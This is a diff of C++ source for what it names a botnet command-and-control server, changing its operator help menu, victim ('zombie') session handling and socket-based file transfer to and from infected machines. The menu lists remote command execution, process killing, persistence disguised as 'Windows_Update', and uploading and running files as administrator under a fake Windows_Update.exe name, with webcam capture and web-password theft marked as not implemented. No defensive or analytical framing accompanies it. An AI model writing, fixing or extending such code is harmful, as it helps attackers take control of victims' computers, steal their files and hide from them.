@@ -22,8 +22,6 @@ void Info::list_scripts()
 	print_status("[ ps\t\t\t\t\t: List all process with their PID and name");
 	print_status("[ kill -p <pid>\t\t\t\t: Kill a process by its PID");
 	print_status("[ kill -n <name>\t\t\t\t: Kill a process by its name");
-	print_status("[ self_persistence <keyname>\t\t: Put a persistence on the payload");
-	print_status("[ default name is Windows_Update");
 	print_status("[ persistence <file_name> <keyname>\t\t: Put a persistence on a given file in the current directory----NOT IMPLEMENTED");
 	print_status("[ default keyname is Windows_Update");
 	print_status("[ cmd <command>\t\t\t\t: Run a command using cmd");
@@ -36,6 +34,8 @@ void Info::list_scripts()
 	print_status("[ geo\t\t\t\t: Give the localization of the current session------NOT IMPLEMENTED");
 	print_status("[ enum_web\t\t\t\t: enum all web passwords on the current session------NOT IMPLEMENTED" );
 	print_status("[ screenshot\t\t\t: Take a screenshot from the current target screen------NOT IMPLEMENTED");
+	print_status("[ webcam <minutes>\t\t\t: Record from webcame for a given minutes, default is 1minute------NOT IMPLEMENTED");
+	print_status("[ webcam_photo\t\t\t: Take a photo using the webcam ------NOT IMPLEMENTED");
 	print_status("[ ask <exe> <name>\t\t\t: Upload and execute a given file as administrator with a custom name");
 	print_status("[ you can choose a new file_name, default is Windows_Update.exe");
 
@@ -53,7 +53,6 @@ void Info::print_help()
 	print_status("[ version\t\t\t: Print the current version and changes");
 	print_status("[ getcurrentsession\t\t: Print the information about the current session");
 	print_status("[ getsysinfo\t\t: Give information about the current session (user ...)");
-	print_status("[ getip\t\t\t: Give the External IP address of the current session");
 	print_status("[ set_session <nb_session>\t: Switch to an another session");
 	print_status("[ list\t\t\t: list all actives sessions");
 	print_status("[ mute <nb>\t\t\t: Mute a zombie");
@@ -65,11 +64,12 @@ void Info::print_help()
  bool Info::set_session(Server* server,const std::string nb_session)
 {
 	int nb= atoi(nb_session.c_str());
-	std::vector<st_Client> clients = server->getClients();
-	if (nb <= clients.size())
+	nb--; // Print as : Zombie 1 but in real it's Zombie 0 so nb-- otherwise vector error [!]
+
+	if (nb <= server->getClients().size())
 	{
 		print_status("Switching with session " + nb_session+" ...");
-		server->setDefaultClient(clients[nb-1]);
+		server->setDefaultClient(server->getClients()[nb]);
 		print_done("Done");
 		return 1;
 	}
@@ -83,10 +83,9 @@ void Info::print_help()
  void Info::list(Server* server)
 {
 	print_status("Enuming clients...");
-	std::vector<st_Client> clients = server->getClients();
-	for (int i = 0; i < clients.size(); i++)
+	for (int i = 0; i < server->getClients().size(); i++)
 	{
-		print_done("Zombie " + std::to_string(clients[i].number) + " Ip : " + clients[i].ip_extern);
+		print_done("Zombie " + std::to_string(server->getClients()[i].number) + " Ip : " + server->getClients()[i].ip_extern);
 	}
 }
 
@@ -95,6 +94,7 @@ void Info::version(Server* server)
 	print_debug("BOTNET version : " + std::string(VERSION));
 	print_debug("Last update : " + std::string(UPDATE));
 }
+
 void Info::getcurrentsession(Server* server)
 {
 	print_status("Current session number : " + server->getDefaultClient().number);
@@ -126,7 +126,7 @@ void SetColor(int value)
 }
 #endif
 
-void Transfer::uploadToClient(Server* serv1, SOCKET& cl_sock, const std::string filename)
+void Transfer::uploadToClient(Server* serv1, SOCKET* cl_sock, const std::string filename)
 {
 	print_status("Starting the upload of : "+ filename );
 	char buffer[BUFFER_LEN] = { 0 };
@@ -140,8 +140,8 @@ void Transfer::uploadToClient(Server* serv1, SOCKET& cl_sock, const std::string 
 		
 		print_status(std::to_string(size) + " bytes to send");
 
-		send(cl_sock, std::to_string(size).c_str(), BUFFER_LEN, 0); // SIZE
-		recv(cl_sock, buffer, BUFFER_LEN, 0); // TEST OK OR STOP
+		send(*cl_sock, std::to_string(size).c_str(), BUFFER_LEN, 0); // SIZE
+		recv(*cl_sock, buffer, BUFFER_LEN, 0); // TEST OK OR STOP
 
 		if (std::string(buffer) == "OK")
 		{
@@ -158,20 +158,28 @@ void Transfer::uploadToClient(Server* serv1, SOCKET& cl_sock, const std::string 
 			int pourcentage = 0;
 			//	std::thread t_refresh(refresh, &done,200,&pourcentage);
 			int boucle = 0;
+			print_warning("Please wait until the file is transfered");
+			int ret = 0;
 			while (current_size != size)
 			{
 				if (current_size + rest == size)
 				{
 					file.read(memblock, rest);
-					send(cl_sock, memblock, rest, 0);
+					ret = send(*cl_sock, memblock, rest, 0);
 					break;
 				}
 				else
 				{
 					file.read(memblock, len);
-					send(cl_sock, memblock, len, 0);
+					ret = send(*cl_sock, memblock, len, 0);
 					current_size += len;
 					file.seekg(current_size, std::ios::beg);
+				}
+				//print_status("Ret : " + std::to_string(ret));
+				if (ret == 0)
+				{
+					print_error("Error, no byte recv, aborting");
+					break;
 				}
 				//pourcentage = current_size * 100;
 				//pourcentage = pourcentage / size;
@@ -180,7 +188,6 @@ void Transfer::uploadToClient(Server* serv1, SOCKET& cl_sock, const std::string 
 			//done = 1;
 			//t_refresh.join();
 			print_done("Done");
-			print_done("Boucle : " + std::to_string(boucle));
 		}
 		else
 		{
@@ -189,7 +196,7 @@ void Transfer::uploadToClient(Server* serv1, SOCKET& cl_sock, const std::string 
 	}
 	else
 	{
-		send(cl_sock, "STOP", 5, 0);
+		send(*cl_sock, "STOP", 5, 0);
 		print_error("Error can\'t open file : ");
 #ifndef _WIN32
 		print_error("Error : " + std::string(strerror(errno)));
@@ -197,10 +204,13 @@ void Transfer::uploadToClient(Server* serv1, SOCKET& cl_sock, const std::string 
 	}
 }
 
-void Transfer::downloadFromClient(Server* serv1,SOCKET& cl_sock, const std::string filename)
+void Transfer::downloadFromClient(Server* serv1,SOCKET* cl_sock, const std::string filename)
 {	
 	char buffer[BUFFER_LEN] = { 0 };
-	recv(cl_sock, buffer, BUFFER_LEN, 0); // SIZE
+	int ret = 0;
+	print_warning("Getting size ..");
+	
+	ret = recv(*cl_sock, buffer, BUFFER_LEN, 0); // SIZE
 
 	const unsigned int size = atoi(buffer);
 	std::cout << "SIZE : " << size << " buffer : "<< buffer << std::endl;
@@ -210,7 +220,7 @@ void Transfer::downloadFromClient(Server* serv1,SOCKET& cl_sock, const std::stri
 
 	if (file_export && size != 0)
 	{
-		send(cl_sock, "OK", 3, 0);
+		send(*cl_sock, "OK", 3, 0); // OK SO WE CONTINUE
 		print_status("File created");
 		print_warning("Starting the download ..");
 		const int len = 1024;
@@ -224,21 +234,28 @@ void Transfer::downloadFromClient(Server* serv1,SOCKET& cl_sock, const std::stri
 		bool done = 0;
 		int boucle = 0;
 	//	std::thread t_refresh(refresh, &done, 200, &pourcentage);
-		print_status("Please wait until the file is transfered ..");
+		print_warning("Please wait until the file is transfered ..");
 
 		while (current_size != size || std::string(memblock) == "STOP")
 		{
 			if (current_size + rest == size)
 			{
-				recv(cl_sock, memblock, rest, 0);
+				ret = recv(*cl_sock, memblock, rest, 0);
+				
 				file_export.write(memblock, rest);
 				break;
 			}
 			else
 			{
-				recv(cl_sock, memblock, len, 0);
+				ret = recv(*cl_sock, memblock, len, 0);
 				file_export.write(memblock, len);
 				current_size += len;
+			}
+	//		print_status("Ret : " + std::to_string(ret));
+			if (ret == 0)
+			{
+				print_error("Error, no byte recv, aborting");
+				break;
 			}
 			pourcentage = current_size * 100;
 			pourcentage = pourcentage / size;
@@ -252,12 +269,11 @@ void Transfer::downloadFromClient(Server* serv1,SOCKET& cl_sock, const std::stri
 	//	t_refresh.join();
 		file_export.close();
 		print_done("Done");
-		print_done("Boucle : " + std::to_string(boucle));
 		
 	}
 	else
 	{
-		send(cl_sock, "STOP", 5, 0);
+		send(*cl_sock, "STOP", 5, 0);
 		print_error("Can't create the file : "+filename+" with size : "+std::to_string(size));
 	}
 }
@@ -278,33 +294,3 @@ int Transfer::getSize(std::string filename)
 		return 0;
 
 }
-
-void Transfer::recvString(SOCKET cl_sock,const unsigned short nb)
-{
-	char size_ch[256] = { 0 };
-	recv(cl_sock, size_ch, sizeof(size_ch), 0);
-	int size = atoi(size_ch);
-	int current_size = 0;
-	int rest = size % BUFFER_LEN;
-	char buffer[BUFFER_LEN] = { 0 };
-	print_status("Zombie " + std::to_string(nb)+" :\n");
-
-	while (current_size != size)
-	{
-		if (current_size + rest == size)
-		{
-			current_size += rest;
-		}
-		else
-		{
-			
-			current_size += BUFFER_LEN;
-
-		}
-		recv(cl_sock, buffer, BUFFER_LEN, 0);
-		print_status(std::string(buffer));
-		std::this_thread::sleep_for(std::chrono::milliseconds(100));
-	}
-	
-}
-
